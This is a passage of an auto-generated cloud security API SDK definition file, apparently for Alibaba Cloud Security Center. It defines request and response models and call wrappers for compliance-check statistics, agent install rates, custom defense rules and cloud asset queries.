 * @summary Queries the summary information about the configuration checks on cloud services.
 *
 * @param request GetCheckSummaryRequest
 * @return GetCheckSummaryResponse
 */
async function getCheckSummary(request: GetCheckSummaryRequest): GetCheckSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return getCheckSummaryWithOptions(request, runtime);
}

model GetCheckTimeDimensionStatisticRequest {
  endTimeStamp?: long(name='EndTimeStamp', description='End time, in timestamp format.', example='1672285044000'),
  startTimeStamp?: long(name='StartTimeStamp', description='Start time, in timestamp format.', example='1672385044000'),
  statisticType?: string(name='StatisticType', description='Type of statistical data. Values:
- **CheckPassRate**: Check item pass rate.
- **AssetPassRate**: Asset pass rate.', example='AssetPassRate'),
  vendors?: [ string ](name='Vendors', description='List of cloud vendors.'),
}

model GetCheckTimeDimensionStatisticResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the current request, a unique identifier generated by Alibaba Cloud for this request, which can be used to troubleshoot and locate issues.', example='028CF634-5268-5660-9575-48C9ED6B****'),
  timeDimensionStatisticDTO?: {
    dates?: [ long ](name='Dates', description='List of data time points.'),
    statisticType?: string(name='StatisticType', description='Type of statistical data. Values:
- **CheckPassRate**: Check item pass rate.
- **AssetPassRate**: Asset pass rate.', example='CheckPassRate'),
    timeDimensionStatisticItems?: [ 
      {
        dataTime?: long(name='DataTime', description='Data time, in timestamp format.', example='1712592000000'),
        statisticDatas?: [ 
          {
            name?: string(name='Name', description='Data type.', example='COMPLIANCE_Pass'),
            value?: int32(name='Value', description='Quantity.', example='194'),
          }
        ](name='StatisticDatas', description='List of statistical data.'),
      }
    ](name='TimeDimensionStatisticItems', description='Time trend statistical data results.'),
  }(name='TimeDimensionStatisticDTO', description='List of time trend statistical data results.'),
}

model GetCheckTimeDimensionStatisticResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetCheckTimeDimensionStatisticResponseBody(name='body'),
}

/**
 * @summary Get time trend statistics data
 *
 * @param request GetCheckTimeDimensionStatisticRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetCheckTimeDimensionStatisticResponse
 */
async function getCheckTimeDimensionStatisticWithOptions(request: GetCheckTimeDimensionStatisticRequest, runtime: Util.RuntimeOptions): GetCheckTimeDimensionStatisticResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.endTimeStamp)) {
    query['EndTimeStamp'] = request.endTimeStamp;
  }
  if (!Util.isUnset(request.startTimeStamp)) {
    query['StartTimeStamp'] = request.startTimeStamp;
  }
  if (!Util.isUnset(request.statisticType)) {
    query['StatisticType'] = request.statisticType;
  }
  if (!Util.isUnset(request.vendors)) {
    query['Vendors'] = request.vendors;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetCheckTimeDimensionStatistic',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Get time trend statistics data
 *
 * @param request GetCheckTimeDimensionStatisticRequest
 * @return GetCheckTimeDimensionStatisticResponse
 */
async function getCheckTimeDimensionStatistic(request: GetCheckTimeDimensionStatisticRequest): GetCheckTimeDimensionStatisticResponse {
  var runtime = new Util.RuntimeOptions{};
  return getCheckTimeDimensionStatisticWithOptions(request, runtime);
}

model GetClientRatioStatisticRequest {
  resourceDirectoryAccountId?: long(name='ResourceDirectoryAccountId', description='The ID of the primary account of the Resource Directory member account.
> call the [DescribeMonitorAccounts](~~DescribeMonitorAccounts~~) interface to obtain this parameter.', example='127608589417****'),
  statisticTypes?: [ string ](name='StatisticTypes', description='An array that consists of the details of a statistical type.'),
  timeEnd?: long(name='TimeEnd', description='The timestamp that specifies the end of the time range to collect statistics. Unit: milliseconds.

This parameter is required.', example='1686412799999'),
  timeStart?: long(name='TimeStart', description='The timestamp that specifies the beginning of the time range to collect statistics. Unit: milliseconds.

This parameter is required.', example='1671382800000'),
}

model GetClientRatioStatisticResponseBody = {
  clientInstallRatio?: {
    currentItems?: [ 
      {
        items?: [ 
          {
            assetTotalCount?: int32(name='AssetTotalCount', description='The total number of assets.', example='100'),
            calculateTime?: long(name='CalculateTime', description='The timestamp of the calculation. Unit: milliseconds.', example='1687759630045'),
            installRatio?: double(name='InstallRatio', description='The installation rate. Unit: %.', example='70.00'),
            installedAssetCount?: int32(name='InstalledAssetCount', description='The number of assets on which the client is installed.', example='70'),
          }
        ](name='Items', description='The list of the statistics on the installation rate of the client by vendor.'),
        vendor?: long(name='Vendor', description='The type of the server. Valid values:

*   **0**: an asset provided by Alibaba Cloud
*   **1**: a third-party cloud asset
*   **2**: an asset in a data center
*   **3**, **4**, **5**, and **7**: other cloud asset
*   **8**: a lightweight asset', example='0'),
      }
    ](name='CurrentItems', description='The list of current statistics on the installation rate of the client.'),
    historyItems?: [ 
      {
        items?: [ 
          {
            assetTotalCount?: int32(name='AssetTotalCount', description='The total number of assets.', example='100'),
            calculateTime?: long(name='CalculateTime', description='The timestamp of the calculation. Unit: milliseconds.', example='1687759630045'),
            installRatio?: double(name='InstallRatio', description='The installation rate. Unit: %.', example='80.00'),
            installedAssetCount?: int32(name='InstalledAssetCount', description='The number of assets on which the client is installed.', example='80'),
          }
        ](name='Items', description='The list of statistics on the client installation rate.'),
        vendor?: long(name='Vendor', description='The type of the cloud asset. Valid values:

*   **0**: an asset provided by Alibaba Cloud
*   **1**: a third-party cloud asset
*   **2**: an asset in a data center
*   **3**, **4**, **5**, and **7**: other cloud asset
*   **8**: a simple application server', example='3'),
      }
    ](name='HistoryItems', description='The list of historical statistics on the installation rate of the client.'),
  }(name='ClientInstallRatio', description='The statistics on the client installation rate.'),
  clientOnlineRatio?: {
    currentItems?: [ 
      {
        items?: [ 
          {
            assetInstallCount?: int32(name='AssetInstallCount', description='The number of assets on which the client is installed.', example='50'),
            calculateTime?: long(name='CalculateTime', description='The timestamp of the calculation. Unit: milliseconds.', example='1687759630045'),
            onlineAssetCount?: int32(name='OnlineAssetCount', description='The number of online assets.', example='10'),
            onlineRatio?: double(name='OnlineRatio', description='The online rate. Unit: %.', example='20.00'),
          }
        ](name='Items', description='The list of current statistics on the online rate of the client by vendor.'),
        vendor?: long(name='Vendor', description='The type of the cloud asset. Valid values:

*   **0**: an asset provided by Alibaba Cloud
*   **1**: a third-party cloud asset
*   **2**: an asset in a data center
*   **3**, **4**, **5**, and **7**: other cloud asset
*   **8**: a simple application server', example='3'),
      }
    ](name='CurrentItems', description='The list of current statistics on the online rate of the client.'),
    historyItems?: [ 
      {
        items?: [ 
          {
            assetInstallCount?: int32(name='AssetInstallCount', description='The number of assets on which the client is installed.', example='50'),
            calculateTime?: long(name='CalculateTime', description='The timestamp of the calculation. Unit: milliseconds.', example='1687759630045'),
            onlineAssetCount?: int32(name='OnlineAssetCount', description='The number of online assets.', example='20'),
            onlineRatio?: double(name='OnlineRatio', description='The online rate. Unit: %.', example='40.00'),
          }
        ](name='Items', description='The list of historical statistics on the online rate of the client by vendor.'),
        vendor?: long(name='Vendor', description='The type of the server. Valid values:

*   **0**: an asset provided by Alibaba Cloud
*   **1**: a third-party cloud asset
*   **2**: an asset in a data center
*   **3**, **4**, **5**, and **7**: other cloud asset
*   **8**: a lightweight asset', example='7'),
      }
    ](name='HistoryItems', description='The list of historical statistics on the online rate of the client.'),
  }(name='ClientOnlineRatio', description='The statistics on the client online rate.'),
  dates?: [ long ](name='Dates', description='The list of time when statistics were collected.'),
  requestId?: string(name='RequestId', description='The request ID.', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB3936FA7'),
}

model GetClientRatioStatisticResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetClientRatioStatisticResponseBody(name='body'),
}

/**
 * @summary Queries the installation rate and online rate of the agent.
 *
 * @param request GetClientRatioStatisticRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetClientRatioStatisticResponse
 */
async function getClientRatioStatisticWithOptions(request: GetClientRatioStatisticRequest, runtime: Util.RuntimeOptions): GetClientRatioStatisticResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.resourceDirectoryAccountId)) {
    query['ResourceDirectoryAccountId'] = request.resourceDirectoryAccountId;
  }
  if (!Util.isUnset(request.statisticTypes)) {
    query['StatisticTypes'] = request.statisticTypes;
  }
  if (!Util.isUnset(request.timeEnd)) {
    query['TimeEnd'] = request.timeEnd;
  }
  if (!Util.isUnset(request.timeStart)) {
    query['TimeStart'] = request.timeStart;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetClientRatioStatistic',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the installation rate and online rate of the agent.
 *
 * @param request GetClientRatioStatisticRequest
 * @return GetClientRatioStatisticResponse
 */
async function getClientRatioStatistic(request: GetClientRatioStatisticRequest): GetClientRatioStatisticResponse {
  var runtime = new Util.RuntimeOptions{};
  return getClientRatioStatisticWithOptions(request, runtime);
}

model GetClientUserDefineRuleRequest {
  id?: long(name='Id', description='The ID of the custom defense rule.

This parameter is required.', example='200****'),
}

model GetClientUserDefineRuleResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='0B48AB3C-84FC-424D-A01D-B9270EF4****'),
  userDefineRuleDetail?: {
    actionType?: string(name='ActionType', description='The action of the custom defense rule. Valid values:

*   **0**: allow
*   **1**: block', example='0'),
    cmdline?: string(name='Cmdline', description='The command line.', example='/usr/sbin/s****'),
    domain?: string(name='Domain', description='The domain name.', example='example.com'),
    filePath?: string(name='FilePath', description='The file path.', example='/etc/pam****'),
    gmtCreate?: long(name='GmtCreate', description='The time when the custom defense rule was created.', example='167118088****'),
    gmtModified?: long(name='GmtModified', description='The time when the custom defense rule was last modified.', example='167118088****'),
    IP?: string(name='IP', description='The IP address.', example='10.240.XX.XX'),
    id?: long(name='Id', description='The ID of the custom defense rule.', example='200****'),
    md5List?: string(name='Md5List', description='The hash values of processes.', example='0c9045b5bec90f9825f1f3f64dd4****'),
    name?: string(name='Name', description='The name of the custom defense rule.', example='Rule\\\\*\\\\*\\\\*\\\\*'),
    newFilePath?: string(name='NewFilePath', description='The new file path after the file is renamed.', example='/etc/pam****'),
    parentCmdline?: string(name='ParentCmdline', description='The parent command line.', example='/usr/sbin/s****'),
    parentProcPath?: string(name='ParentProcPath', description='The path to the parent process.', example='c:/windows/system32/i****'),
    platform?: string(name='Platform', description='The type of the operating system. Valid values:

*   **linux**
*   **windows**
*   **all**', example='linux'),
    port?: int32(name='Port', description='The port number.', example='22'),
    portStr?: string(name='PortStr', description='The port number. Valid values: 1 to 65535.', example='80'),
    procPath?: string(name='ProcPath', description='The path to the process.', example='c:/windows/system32/i****'),
    registryContent?: string(name='RegistryContent', description='The registry value.', example='*SECOH-QAD.exe*'),
    registryKey?: string(name='RegistryKey', description='The registry key.', example='HKEY_DYN_****'),
    type?: int32(name='Type', description='The type of the custom defense rule. Valid values:

*   **1**: Process hash
*   **2**: Command line
*   **3**: Process Network
*   **4**: File Read and Write
*   **5**: Operation on Registry
*   **6**: Dynamic-link Library Loading
*   **7**: File Renaming', example='1'),
  }(name='UserDefineRuleDetail', description='The information about the custom defense rule.'),
}

model GetClientUserDefineRuleResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetClientUserDefineRuleResponseBody(name='body'),
}

/**
 * @summary Queries the information about a custom defense rule.
 *
 * @param request GetClientUserDefineRuleRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetClientUserDefineRuleResponse
 */
async function getClientUserDefineRuleWithOptions(request: GetClientUserDefineRuleRequest, runtime: Util.RuntimeOptions): GetClientUserDefineRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetClientUserDefineRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the information about a custom defense rule.
 *
 * @param request GetClientUserDefineRuleRequest
 * @return GetClientUserDefineRuleResponse
 */
async function getClientUserDefineRule(request: GetClientUserDefineRuleRequest): GetClientUserDefineRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return getClientUserDefineRuleWithOptions(request, runtime);
}

model GetCloudAssetCriteriaRequest {
  cloudAssetTypes?: [ 
    {
      assetSubType?: int32(name='AssetSubType', description='The subtype of the cloud service or asset. Valid values:

*   **0**: ECS

    *   **0**: instance
    *   **1**: disk (storage)
    *   **2**: security group

*   **1**: SLB

    *   **0**: SLB
    *   **1**: Application Load Balancer (ALB)

*   **3**: ApsaraDB RDS

    *   **0**: instance

*   **4**: MongoDB

    *   **0**: instance

*   **5**: Redis

    *   **0**: instance

*   **6**: Container Registry

    *   **1**: Enterprise Edition
    *   **2**: Personal Edition

*   **8**: ACK

    *   **0**: cluster

*   **9**: VPC

    *   **0**: NAT gateway
    *   **1**: Elastic IP address (EIP)
    *   **2**: VPN
    *   **3**: VPC Flow Logs

*   **11**: ActionTrail

    *   **0**: trail

*   **12**: CDN

    *   **0**: instance

*   **13**: Certificate Management Service (formerly SSL Certificates Service)

    *   **0**: certificate

*   **14**: Apsara Devops

    *   **0**: organization

*   **16**: Anti-DDoS

    *   **0**: instance

*   **17**: WAF

    *   **0**: domain name

*   **18**: OSS

    *   **0**: bucket

*   **19**: PolarDB

    *   **0**: cluster

*   **20**: ApsaraDB RDS for PostgreSQL

    *   **0**: instance

*   **21**: MSE

    *   **0**: cluster

*   **22**: NAS

    *   **0**: file system

*   **23**: DSC

    *   **0**: instance

*   **24**: EIP

    *   **0**: Anycast EIP

*   **25**: IDaaS EIAM

    *   **0**: instance

*   **26**: PolarDB-X

    *   **0**: instance

*   **27**: Elasticsearch

    *   **0**: instance', example='2'),
      assetType?: int32(name='AssetType', description='The type of the asset. Valid values:

*   **0**: Elastic Compute Service (ECS)
*   **1**: Server Load Balancer (SLB)
*   **3**: ApsaraDB RDS
*   **4**: ApsaraDB for MongoDB (MongoDB)
*   **5**: ApsaraDB for Redis (Redis)
*   **6**: Container Registry
*   **8**: Container Service for Kubernetes (ACK)
*   **9**: Virtual Private Cloud (VPC)
*   **11**: ActionTrail
*   **12**: Alibaba Cloud CDN (CDN)
*   **13**: Certificate Management Service (formerly SSL Certificates Service)
*   **14**: Apsara Devops
*   **16**: Anti-DDoS
*   **17**: Web Application Firewall (WAF)
*   **18**: Object Storage Service (OSS)
*   **19**: PolarDB
*   **20**: ApsaraDB RDS for PostgreSQL
*   **21**: Microservices Engine (MSE)
*   **22**: File Storage NAS (NAS)
*   **23**: Data Security Center (DSC)
*   **24**: Elastic IP Address (EIP)
*   **25**: IDaaS EIAM
*   **26**: PolarDB-X
*   **27**: Elasticsearch', example='9'),
    }
  ](name='CloudAssetTypes', description='The types of cloud assets.'),
  value?: string(name='Value', description='The keyword for fuzzy search when you query the asset.', example='testwww'),
}

model GetCloudAssetCriteriaResponseBody = {
  criteriaList?: [ 
    {
      multiValues?: string(name='MultiValues', description='The structured attribute values of the assets that match the keyword. The value of this parameter is in the JSON format and contains the following fields:

*   **vendor**: providers
*   **regionIds**: IDs of supported regions', example='[{"vendor":0,"regionIds":{"default":["ap-southeast-1","ap-northeast-2","ap-southeast-3","ap-southeast-5","ap-southeast-7","me-central-1"]}},{"vendor":1,"regionIds":{"default":["outside-of-aliyun"]}}]'),
      name?: string(name='Name', description='The name of the filter condition. Valid values:

*   **instanceId**: the ID of the instance
*   **instanceName**: the name of an instance
*   **internetIp**: the public IP address
*   **riskStatus**: the risk status
*   **vendorRegionId**: the region ID by service provider', example='instanceId'),
      type?: string(name='Type', description='The type of the filter condition. Valid values:

*   **input**: The filter condition needs to be specified.
*   **select**: The filter condition is an option that can be selected from the drop-down list.', example='select'),
      values?: string(name='Values', description='The values of the search condition. This parameter is returned only if the value of **Type** is **select**.

>  If the value of **Type** is **input**, the value of this parameter is an empty string.', example='fvt*'),
    }
  ](name='CriteriaList', description='An array consisting of the information about the filter conditions that are used to search for cloud assets.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='24A20733-10A0-4AF6-BE6B-E3322413BB68'),
}

model GetCloudAssetCriteriaResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetCloudAssetCriteriaResponseBody(name='body'),
}

/**
 * @summary Queries the filter conditions that are used to search for cloud assets.
 *
 * @param request GetCloudAssetCriteriaRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetCloudAssetCriteriaResponse
 */
async function getCloudAssetCriteriaWithOptions(request: GetCloudAssetCriteriaRequest, runtime: Util.RuntimeOptions): GetCloudAssetCriteriaResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.cloudAssetTypes)) {
    query['CloudAssetTypes'] = request.cloudAssetTypes;
  }
  if (!Util.isUnset(request.value)) {
    query['Value'] = request.value;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetCloudAssetCriteria',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the filter conditions that are used to search for cloud assets.
 *
 * @param request GetCloudAssetCriteriaRequest
 * @return GetCloudAssetCriteriaResponse
 */
async function getCloudAssetCriteria(request: GetCloudAssetCriteriaRequest): GetCloudAssetCriteriaResponse {
  var runtime = new Util.RuntimeOptions{};
  return getCloudAssetCriteriaWithOptions(request, runtime);
}

model GetCloudAssetDetailRequest {
  assetSubType?: int32(name='AssetSubType', description='The subtype of the cloud service.', example='0'),
  assetType?: int32(name='AssetType', description='The type of the cloud asset. Valid values:

*   **0**: Elastic Compute Service (ECS).
*   **1**: Server Load Balancer (SLB).
*   **3**: ApsaraDB RDS.
*   **4**: ApsaraDB for MongoDB.
*   **5**: ApsaraDB for Redis.
*   **6**: Container Registry.
*   **8**: Container Service for Kubernetes.
*   **9**: Virtual Private Cloud (VPC).
*   **11**: ActionTrail.
*   **12**: Alibaba Cloud CDN (CDN).
*   **13**: Certificate Management Service.
*   **14**: Apsara Devops.
*   **15**: Resource Access Management (RAM).
*   **16**: Anti-DDoS.
*   **17**: Web Application Firewall (WAF).
*   **18**: Object Storage Service (OSS).
*   **19**: PolarDB.
*   **20**: ApsaraDB RDS for PostgreSQL.
*   **21**: Microservices Engine (MSE).
*   **22**: File Storage NAS (NAS).
*   **23**: Data Security Center (DSC).
*   **24**: Elastic IP Address (EIP).
*   **25**: Identity as a Service (IDaaS)-Employee Identity and Access Management (EIAM).
*   **26**: PolarDB-X.
*   **27**: Elasticsearch.', example='14'),
  cloudAssetInstances?: [ 
    {
      instanceId?: string(name='InstanceId', description='The instance ID of the cloud asset.', example='sg-wz9hf86vbzbrrde7****'),
      regionId?: string(name='RegionId', description='The region in which the cloud asset resides.

> For more information about the mapping between region IDs and region names, see [Regions and zones](https://help.aliyun.com/document_detail/40654.html).', example='cn-hangzhou'),
    }
  ](name='CloudAssetInstances', description='The details of the assets.'),
  vendor?: int32(name='Vendor', description='The service provider of the cloud asset. Valid values:

*   **0**: Alibaba Cloud.
*   **1**: service provider that is unrecognized.
*   **2**: data center.
*   **3**, **4**, **5**, and **7**: third-party service provider.
*   **8**: simple application server.', example='0'),
}

model GetCloudAssetDetailResponseBody = {
  count?: int32(name='Count', description='The number of instances in the list of cloud assets returned.', example='1'),
  instances?: [ 
    {
      alarmStatus?: string(name='AlarmStatus', description='Indicates whether alerts are generated for the current cloud asset. Valid values:

*   **YES**
*   **NO**', example='NO'),
      assetSubType?: int32(name='AssetSubType', description='The subtype of the cloud asset.', example='0'),
      assetSubTypeName?: string(name='AssetSubTypeName', description='The name of the cloud asset subtype.', example='INSTANCE'),
      assetType?: int32(name='AssetType', description='The type of the cloud asset. Valid values:

*   **0**: ECS.
*   **1**: SLB.
*   **3**: ApsaraDB RDS.
*   **4**: ApsaraDB for MongoDB.
*   **5**: ApsaraDB for Redis.
*   **6**: Container Registry.
*   **8**: Container Service for Kubernetes.
*   **9**: VPC.
*   **11**: ActionTrail.
*   **12**: CDN.
*   **13**: Certificate Management Service.
*   **14**: Apsara Devops.
*   **15**: RAM.
*   **16**: Anti-DDoS.
*   **17**: WAF.
*   **18**: OSS.
*   **19**: PolarDB.
*   **20**: ApsaraDB RDS for PostgreSQL.
*   **21**: MSE.
*   **22**: NAS.
*   **23**: DSC.
*   **24**: EIP.
*   **25**: IDaaS-EIAM.
*   **26**: PolarDB-X.
*   **27**: Elasticsearch.', example='3'),
      assetTypeName?: string(name='AssetTypeName', description='The name of the cloud asset type.', example='RDS'),
      createdTime?: long(name='CreatedTime', description='The time when the instance was created. The value is a timestamp.', example='1607365213000'),
      detailLink?: string(name='DetailLink', description='The detailed address of the cloud asset.'),
      instanceId?: string(name='InstanceId', description='The instance ID of the cloud asset.', example='rm-uf6t6u05n6g48****'),
      instanceName?: string(name='InstanceName', description='The instance name of the cloud asset.', example='yztest-l***'),
      internetIp?: string(name='InternetIp', description='The public IP address of the instance.', example='1.2.XX.XX'),
      regionId?: string(name='RegionId', description='The region in which the cloud asset resides.

> For more information about the mapping between region IDs and region names, see [Regions and zones](https://help.aliyun.com/document_detail/40654.html).', example='cn-hanghzou'),
      riskStatus?: string(name='RiskStatus', description='Indicates whether risks are detected on the current cloud asset. Valid values:

*   **YES**
*   **NO**', example='NO'),
      securityInfo?: string(name='SecurityInfo', description='The security information about the cloud asset.', example='{\\\\"seriousNum\\\\":0,\\\\"appNum\\\\":0,\\\\"baselineMedium\\\\":0,\\\\"remindNum\\\\":0,\\\\"imageVulNntf\\\\":0,\\\\"cveNum\\\\":0,\\\\"vul\\\\":0,\\\\"uuid\\\\":\\\\"rm-uf6t6u05n6g485o70\\\\",\\\\"emgNum\\\\":0,\\\\"weakPWNum\\\\":0,\\\\"imageMaliciousFileRemind\\\\":0,\\\\"imageBaselineMedium\\\\":0,\\\\"laterVulCount\\\\":0,\\\\"cmsNum\\\\":0,\\\\"imageMaliciousFileSerious\\\\":0,\\\\"agentlessMalicious\\\\":0,\\\\"suspNum\\\\":0,\\\\"imageBaselineHigh\\\\":0,\\\\"asapVulCount\\\\":0,\\\\"imageVulLater\\\\":0,\\\\"agentlessAll\\\\":0,\\\\"sysNum\\\\":0,\\\\"containerLater\\\\":0,\\\\"containerSuspicious\\\\":0,\\\\"imageBaselineNum\\\\":0,\\\\"newSuspicious\\\\":0,\\\\"nntfVulCount\\\\":0,\\\\"scaNum\\\\":0,\\\\"containerNntf\\\\":0,\\\\"health\\\\":0,\\\\"trojan\\\\":0,\\\\"suspicious\\\\":0,\\\\"imageMaliciousFileSuspicious\\\\":0,\\\\"containerRemind\\\\":0,\\\\"baselineLow\\\\":0,\\\\"imageVulAsap\\\\":0,\\\\"imageBaselineLow\\\\":0,\\\\"containerAsap\\\\":0,\\\\"agentlessBaseline\\\\":0,\\\\"agentlessVulSca\\\\":0,\\\\"agentlessVulCve\\\\":0,\\\\"containerSerious\\\\":0,\\\\"baselineHigh\\\\":0,\\\\"account\\\\":0,\\\\"baselineNum\\\\":6}'),
      vendor?: int32(name='Vendor', description='The service provider of the cloud asset. Valid values:

*   **0**: Alibaba Cloud.
*   **1**: service provider that is unrecognized.
*   **2**: data center.
*   **3**, **4**, **5**, and **7**: third-party service provider.
*   **8**: simple application server.', example='0'),
    }
  ](name='Instances', description='An array that consists of the details of the cloud assets.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='CB45CAED-31C3-517A-8619-10F632D3****'),
}

model GetCloudAssetDetailResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetCloudAssetDetailResponseBody(name='body'),
}

/**
 * @summary Obtains the details of cloud assets.
 *
 * @param request GetCloudAssetDetailRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetCloudAssetDetailResponse
 */
async function getCloudAssetDetailWithOptions(request: GetCloudAssetDetailRequest, runtime: Util.RuntimeOptions): GetCloudAssetDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.assetSubType)) {
    query['AssetSubType'] = request.assetSubType;
  }
  if (!Util.isUnset(request.assetType)) {
    query['AssetType'] = request.assetType;
  }
  if (!Util.isUnset(request.cloudAssetInstances)) {
    query['CloudAssetInstances'] = request.cloudAssetInstances;
  }
  if (!Util.isUnset(request.vendor)) {
    query['Vendor'] = request.vendor;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetCloudAssetDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Obtains the details of cloud assets.
 *
 * @param request GetCloudAssetDetailRequest
 * @return GetCloudAssetDetailResponse
 */
async function getCloudAssetDetail(request: GetCloudAssetDetailRequest): GetCloudAssetDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return getCloudAssetDetailWithOptions(request, runtime);
}

model GetCloudAssetSummaryRequest {
  vendors?: [ int32 ](name='Vendors', description='The asset type by service provider.'),
}

model GetCloudAssetSummaryResponseBody = {
  groupedFields?: {
    cloudAssetSummaryMetas?: [ 
      {
        assetSubType?: int32(name='AssetSubType', description='The subtype of the cloud service.', example='0'),
        assetType?: int32(name='AssetType', description='The type of the cloud service. Valid values:

*   **0**: Elastic Compute Service (ECS)
*   **1**: Server Load Balancer (SLB)
*   **3**: ApsaraDB RDS
*   **4**: ApsaraDB for MongoDB (MongoDB)
*   **5**: ApsaraDB for Redis (Redis)
*   **6**: Container Registry
*   **8**: Container Service for Kubernetes (ACK)
*   **9**: Virtual Private Cloud (VPC)
*   **11**: ActionTrail
*   **12**: Alibaba Cloud CDN (CDN)
*   **13**: Certificate Management Service (formerly SSL Certificates Service)
*   **14**: Apsara Devops
*   **15**: Resource Access Management (RAM)
*   **16**: Anti-DDoS
*   **17**: Web Application Firewall (WAF)
*   **18**: Object Storage Service (OSS)
*   **19**: PolarDB
*   **20**: ApsaraDB RDS for PostgreSQL
*   **21**: Microservices Engine (MSE)
*   **22**: File Storage NAS (NAS)
*   **23**: Data Security Center (DSC)
*   **24**: Elastic IP Address (EIP)
*   **25**: Identity as a Service (IDaaS) - Enterprise Identity Access Management (EIAM)
*   **26**: PolarDB for Xscale (PolarDB-X)
*   **27**: Elasticsearch', example='16'),
        instanceCount?: int32(name='InstanceCount', description='The total number of cloud service instances of this type.', example='16'),
        instanceRiskCount?: int32(name='InstanceRiskCount', description='The total number of cloud service instances that are at risk of this type.', example='5'),
        vendor?: int32(name='Vendor', description='The server type. Valid values:

*   **0**: an asset provided by Alibaba Cloud
*   **1**: an asset outside Alibaba Cloud
*   **2**: an asset in a data center
*   **3**, **4**, **5**, and **7**: an asset provided by a third-party service provider
*   **8**: a lightweight asset', example='3'),
      }
    ](name='CloudAssetSummaryMetas', description='The statistics of cloud services.'),
    instanceCountTotal?: int32(name='InstanceCountTotal', description='The total number of cloud service instances.', example='919'),
    instanceRiskCountTotal?: int32(name='InstanceRiskCountTotal', description='The total number of cloud service instances that are at risk.', example='544'),
  }(name='GroupedFields', description='The summary of cloud services.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F5CF78A7-30AA-59DB-847F-13EE3AE7****'),
}

model GetCloudAssetSummaryResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetCloudAssetSummaryResponseBody(name='body'),
}

/**
 * @summary The total number of instances that are at risk.
 *
 * @param request GetCloudAssetSummaryRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetCloudAssetSummaryResponse
 */
async function getCloudAssetSummaryWithOptions(request: GetCloudAssetSummaryRequest, runtime: Util.RuntimeOptions): GetCloudAssetSummaryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.vendors)) {
    query['Vendors'] = request.vendors;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetCloudAssetSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
